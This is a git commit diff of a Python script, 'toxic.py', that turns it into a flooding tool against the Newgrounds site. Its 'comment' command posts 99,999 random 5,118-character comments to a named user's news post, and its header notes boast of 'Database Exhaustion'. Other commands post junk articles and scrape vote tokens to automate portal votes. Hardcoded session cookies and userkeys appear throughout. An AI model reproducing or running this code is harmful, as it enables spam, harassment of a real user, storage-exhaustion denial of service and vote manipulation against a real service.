e042a3cf3ce97dd18f30b818294b9a79ce56c201
Wayne Kenney <pythogen@wayne.cool>
2017-03-30 22:59:34 -0400

    Update toxic.py

--- Projects/toxic.py
+++ Projects/toxic.py
@@ -14,6 +14,16 @@
 # Use: Personal use.
 # Version: 1.3
 
+# How to (How to configure channel comment)
+# Look for 'A': Replace ID
+# Look for 'B': Replace Profile Name
+
+# - Calculations - NG Comment Flooder,
+# - Database Exhaustion:
+# Hogs 258kb per comment page
+# Hogs about 1MB of storage per 4 pages
+# Hogs 1GB per 4000 pages
+
 # Frame.py:
 
 #Modules
@@ -29,7 +39,7 @@ print '\nPyAqua-1.0 - Requests Module Prototype\nBy Pythogen'
 
 
 
-def id_generator(size=500, chars=string.ascii_uppercase + string.digits):
+def id_generator(size=5118, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size))
 
 #Main Routine.
@@ -55,8 +65,7 @@ def main():
 
 	#Display Banner
 	#print '\n%s\n' % (Service)
-	USERNAME = raw_input("Enter Username: ")
-	PASSWORD = raw_input("Enter Password: ")
+	USERNAME = "Dev"
 
 # ASCII Font Name 'Big'
 print ''
@@ -78,7 +87,7 @@ def cpPrompt():
 	while(True):
 
 		#Listen for command input
-		cmd = raw_input('%s>' % (USERNAME))
+		cmd = raw_input(' %s>' % (USERNAME))
 
 		#Command Construct
 		if cmd == '?':
@@ -89,12 +98,15 @@ def cpPrompt():
 			print '\n' + find_between( processReq.page.content,"Online: (<strong>","</strong>)" ) + '\n'
 		elif cmd == 'quit':
 			quit()
-		elif cmd =='post':
 
-			for i in tqdm(range(1,100000)):
+		# Publish Comment Post
+		elif cmd =='comment':
 
-				time.sleep(1)
+			print "\n Dispersing Toxic Fumes...\n"
 
+			for i in tqdm(range(1,99999)):
+
+				# Generate Data [Single Declaration]
 				a = id_generator()
 
 				#POST Login data
@@ -102,8 +114,8 @@ def cpPrompt():
 				{
 					'comment': a,
 					'page': '1',
-					'id': '983077',
-					'userkey': 'e9d88%O205d996ffb7e%145aOc54097a11f%Pd358br9c%%682c14%7%9%14f%d956sca330e0bObe5dr574crs%907365%%s6%6%af3d35db18br2Pd27f%7erP6fd90ccr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr308135990235575496',
+					'id': '983077', # (A)
+					'userkey': '35988%O005dc86fd782%745aOc54597acff%Pd366dr96%%682c14%7%3%14f%e456sea390e2fObd41r5740rs%68436c%%s2%0%a03d35db280rdPd37d%75rP6fdf30cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr832835990235566881',
 				}
 
 				#Header data
@@ -114,7 +126,10 @@ def cpPrompt():
 					'Referer': 'http://fearnova.newgrounds.com/news/post/983077',
 					'Origin': 'http://fearnova.newgrounds.com',
 					'Host': 'fearnova.newgrounds.com',
-					'Cookie': '__cfduid=db3173c13b913db562a4ced4cb261393c1490501067; remember_me_checkbox=1; ng_adcode_country_id=2; __utma=158261541.1985287000.1490501068.1490501068.1490501068.1; __utmb=158261541.22.9.1490501544103; __utmc=158261541; __utmz=158261541.1490501068.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=132636953.309726048.1490501336.1490501336.1490501336.1; __utmb=132636953.4.10.1490501336; __utmc=132636953; __utmz=132636953.1490501336.1.1.utmcsr=wayne.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/; ng_user0=a%3A1%3A%7Bs%3A7%3A%22default%22%3Ba%3A0%3A%7B%7D%7D; vmkIdu5l8m=H1vgGJEM6EGFs6zk0TsTHgSuTr3f4f3HdF198ALMOCKCL%2FNVcWQI7PQbHwfIl7XLs5c70sG79kaZX0MmEysCeoO9snyMVS%2F1ym9zGn%2FwLvvKT3wraCKFoHaoUxmwoT37PiJsCiG8Sj7XJuxeA_0XtY4BQaWbUv9FE_Lz0lYCoIY%3D; NG_GG_username=fearnova',
+				
+					# IMPORTANT: Cookie must be updated when request conflict occurs (Solution has yet to be discovered)
+					'Cookie': '__cfduid=db3173c13b913db562a4ced4cb261393c1490501067; ng_adcode_country_id=2; NGBBS_timestamp=1490573252; NGBBS_last_visit=1490573252; remember_me_checkbox=1; vmk1du5I8m=mjWW4xODdIo7UxBr6Zvztp2Mo%2F3m5rhUJjpJFyd6RsKAnDsF9yA6D132Ukpu4wLikJwsjZapdF_QtWdBnmjvLhIMUZwO0czHg0ZC3dTBackefdh8xP35nAsnHfQR6cbHZQDjqCq43LzhQA47KjAoUIQJ6EzL0KsGbd_1m7A%2F1Tw%3D; __utma=158261541.1985287000.1490501068.1490612103.1490636898.13; __utmb=158261541.60.9.1490638145991; __utmc=158261541; __utmz=158261541.1490636898.13.13.utmcsr=fearnova.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/; vmkIdu5l8m=6FnAK022VZL3N7Wdhpi9bG9JX44DNwJlq05YpS5QrRe2bSY_OuibIi7C0GEIC69eVfR7HdJI7zdN0rfl7YpbqULGdxZ1eo3hSBwpoCg2EpsXD5VbEQuzri9S97FqfJaR4e02iP9PCuWC4LpO8mkEhvTH46MSypyKnBsuztVS_RA%3D; NG_GG_username=fearnova; ng_user0=a%3A2%3A%7Bs%3A7%3A%22default%22%3Ba%3A0%3A%7B%7Ds%3A10%3A%22Art_portal%22%3Ba%3A1%3A%7Bs%3A21%3A%22suitabilities_to_view%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A1%3A%22e%22%3Bi%3A1%3Bs%3A1%3A%22t%22%3Bi%3A2%3Bs%3A1%3A%22m%22%3B%7D%7D%7D; __utmt=1; __utma=132636953.309726048.1490501336.1490609071.1490636892.10; __utmb=132636953.54.10.1490636892; __utmc=132636953; __utmz=132636953.1490564721.7.4.utmcsr=wayne.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/news/post/944254',
+					
 					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 					'Content-Length': '302',
 					'Connection': 'keep-alive',
@@ -123,11 +138,132 @@ def cpPrompt():
 					'Accept': '*/*',
 				}
 
-				r = requests.get("http://fearnova.newgrounds.com/news/comment")
-				r = requests.post("http://fearnova.newgrounds.com/news/comment", data=data1, headers=header_data2)
+				# Push it!
+				r = requests.post("http://fearnova.newgrounds.com/news/comment", data=data1, headers=header_data2) # (B)
+		
+		# Publish Article Post
+		elif cmd == 'post':
 
+			# Generate Data [Two Declarations]
+			b = id_generator()
+			c = id_generator()
+
+			#POST Login data
+			data2 = \
+			{
+				'image_url': '',
+				'body': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+				'comments_pref': '1',
+				'emoticon': '6',
+				'userkey': '56688%Oc05d116f02ec%245aOc54a97a1ef%Pd35a8r9c%%682c14%7%3%14f%4f56sda3c0e7aOb17br574ars%ae2361%%s4%0%a03d35db38dr9Pd785%7arP6fd952cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr453535990235517654',
+				'post_id': '',
+				'subject': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+			}
+
+			#Header data
+			header_data3 = \
+			{
+				'X-Requested-With': 'XMLHttpRequest',
+				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36',
+				'Referer': 'http://www.newgrounds.com/account/news/post',
+				'Origin': 'http://www.newgrounds.com',
+				'Host': 'www.newgrounds.com',
+				'Cookie': '__cfduid=db3173c13b913db562a4ced4cb261393c1490501067; ng_adcode_country_id=2; remember_me_checkbox=1; __utmt=1; vmkIdu5l8m=hwu2z3jnu47vuw6Wwa205cMgKQWYzWpkr1EvviRxDauCL%2FNVcWQI7PQbHwfIl7XLs5c70sG79kaZX0MmEysCeoO9snyMVS%2F1ym9zGn%2FwLvvKT3wraCKFoHaoUxmwoT37PiJsCiG8Sj7XJuxeA_0XtY4BQaWbUv9FE_Lz0lYCoIY%3D; NG_GG_username=fearnova; ng_user0=a%3A1%3A%7Bs%3A7%3A%22default%22%3Ba%3A0%3A%7B%7D%7D; __utma=158261541.1985287000.1490501068.1490549624.1490551913.5; __utmb=158261541.10.9.1490552782734; __utmc=158261541; __utmz=158261541.1490551913.5.5.utmcsr=fearnova.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/news/post/983077/1804',
+				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+				'Content-Length': '402',
+				'Connection': 'keep-alive',
+				'Accept-Language': 'en-US,en;q=0.8',
+				'Accept-Encoding': 'gzip, deflate',
+				'Accept': '*/*',
+			}
+
+			r = requests.post("http://www.newgrounds.com/account/news/post", data=data2, headers=header_data3)
+
+			print "\n Posted!\n"
+
+
+		elif cmd == 'vote':
+			
+			link = raw_input("Enter Link: ")
+
+			#Header data
+			header_data4 = \
+			{
+				'X-Requested-With': 'XMLHttpRequest',
+				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36',
+				'Referer': 'http://www.newgrounds.com/portal/view/690981',
+				'Origin': 'http://www.newgrounds.com',
+				'Host': 'www.newgrounds.com',
+				'Cookie': '__cfduid=db3173c13b913b562a4ced4cb261393c1490501067; ng_adcode_country_id=2; remember_me_checkbox=1; NGBBS_last_visit=1490573252; NGBBS_timestamp=1490639191; __utma=1.2124903223.1490639197.1490639197.1490639197.1; __utmz=1.1490639197.1.1.utmcsr=newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/portal/view/666980; crtg_rta=ad4g72890020%3D1%3Bad4g336280020%3D1%3Bad4g160600020%3D1%3Bad4g160600040%3D1%3Bad4g3205001%3D1%3B; __qca=P0-1287607432-1490648568034; vmk1du5I8m=sDULSe1cLVJHNTJlrQ5ZYUnvcb8oJ1EZAcITy6IM6FSAnDsF9yA6D132Ukpu4wLikJwsjZapdF_QtWdBnmjvLhIMUZwO0czHg0ZC3dTBackefdh8xP35nAsnHfQR6cbHZQDjqCq43LzhQA47KjAoUIQJ6EzL0KsGbd_1m7A%2F1Tw%3D; __utmt=1; ng_user0=a%3A2%3A%7Bs%3A7%3A%22default%22%3Ba%3A0%3A%7B%7Ds%3A10%3A%22Art_portal%22%3Ba%3A1%3A%7Bs%3A21%3A%22suitabilities_to_view%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A1%3A%22e%22%3Bi%3A1%3Bs%3A1%3A%22t%22%3Bi%3A2%3Bs%3A1%3A%22m%22%3B%7D%7D%7D; vmkIdu5l8m=5FJNkaGXIAAwYVVFu_VR3dT77qetCJL3HW9pcLNkd5kwyeMt1qD72%2FMIJF1T6KLEUgwZcCQFR%2F_D5JAfBJebogsloFHln8rPWCnkOIuVsfIMeSo6LPzNONnti4I7IkHLDxwgJpNU_ZSi1kDcBUcYcYUrigaULUS6%2FUchahnoVrU%3D; NG_GG_username=fearnova; __utma=158261541.1985287000.1490501068.1490822480.1490825156.24; __utmb=158261541.21.9.1490825264133; __utmc=158261541; __utmz=158261541.1490822480.23.23.utmcsr=fearnova.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/news/post/983077',
+				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+				'Content-Length': '461',
+				'Connection': 'keep-alive',
+				'Accept-Language': 'en-US,en;q=0.8',
+				'Accept-Encoding': 'gzip, deflate',
+				'Accept': '*/*',
+			}
 
 			
+			# Get Source
+			srcc = requests.get(link)
+			#print srcc.content
+
+			
+			# Under Construction...
+			ukey = find_between( srcc.content,'/portal/reviews/rate','name="portal_id')
+			ukey2 = find_between(ukey,'value="','/>')
+			ukey = ukey2[:-1]
+			
+
+			titleName = find_between( srcc.content,'<title>','</title>')
+			voteseed = find_between( srcc.content, 'vote_seed" value', '/>' )
+			voteseed = voteseed[:-1]
+			voteseed = voteseed[2:]
+			votekey = find_between( srcc.content, 'vote_key" value', '/>' )
+			votekey = votekey[:-1]
+			votekey = votekey[2:]
+			voteGO = find_between( srcc.content, 'v0">', '>' )
+			voteFin = find_between( voteGO, 'value="', '/' )
+			voteFin = voteFin[:-1]
+			subID = find_between( srcc.content,'item_id" value="','"/>')
+
+			#print srcc.content
+
+			data3 = \
+			{
+				'userkey': ukey2,
+				'vote_seed': voteseed,
+				'vote_key': votekey,
+				'item_id': subID,
+				'portal_id': '1',
+				'vote': voteFin,
+				#'userkey': '76588%Ob05d016f0f7e%145aOc54297a65f%Pd3834r91%%682c14%7%1%14f%1456s5a3d0efbOb9cdr574ers%000368%%s1%5%a73d35db28cr5Pd25f%74rP6fd331cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr908535990235587543',
+				#'vote_seed': '58dc47156b225',
+				#'vote_key': 'JhYrUjVjlhbTcxNzRmQjhhMStxMm0yYjBlYjc7ZmJfNjtxODJkNDE5KzhWMjE5NDQyZjlfNTcxYmNCN2VkNTJmMjExMzgwOTQxcV9CKzFWYjsyOWZtODE4',
+				#'item_id': '673686',
+				#'portal_id': '1',
+				#'vote': '8506bf20e534bbc2ec29fec1c6e93da4',
+			}
+
+			#userkey:b2888%Ob05ddf6ffb3e%745aOc54597a7ff%Pd380br96%%682c14%7%7%14f%2c56s5a360e64Obc1cr5748rs%171364%%s5%8%ac3d35db78er0Pdfed%76rP6fd221cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr933235990235593795
+			#vote_seed:58dc3a02efbbb
+			#vote_key:MgXoWvVmI2bTYxZmVmQjVjYitxN20zYjg2NzA7MTNfNDtxZjI4NmZiKzJWMjM5YmUwNjlfODMxYjFCNzA4OGRmNzc3MjgwOTQxcV9CKzFWYjsyOWZtODY2
+			#item_id:690958
+			#portal_id:1
+			#vote:968df160ae1449fe25e643d1ab7879fd
+
+			print "\ntitleName: %s\n" % (titleName)
+
+			print "ukey: " + ukey2
+			print "voteseed: " + voteseed
+			print "votekey: " + votekey
+			#print "voteGO: " + voteGO
+			print "voteFin: " + voteFin
+			print "subID: " + subID
+
+			r = requests.post("http://www.newgrounds.com/portal/vote", data=data3, headers=header_data4)
+			print r
+			print r.content
 	
 #Used for finding values between tags
 def find_between( s, first, last ):
@@ -140,6 +276,10 @@ def find_between( s, first, last ):
 
 
 def processReq():
+	#Authentication
+	USERNAME = raw_input("Enter Username: ")
+	PASSWORD = raw_input("Enter Password: ")
+
 	#Shorten method
 	with requests.Session() as c:
 	
@@ -189,7 +329,7 @@ def processReq():
 				main()
 				processReq()
 			else:
-				print '\nWelcome, ' + USERNAME + '\n'
+				print '\n Welcome, ' + USERNAME + '\n'
 
 				#Login success. Go to command console
 				cpPrompt()
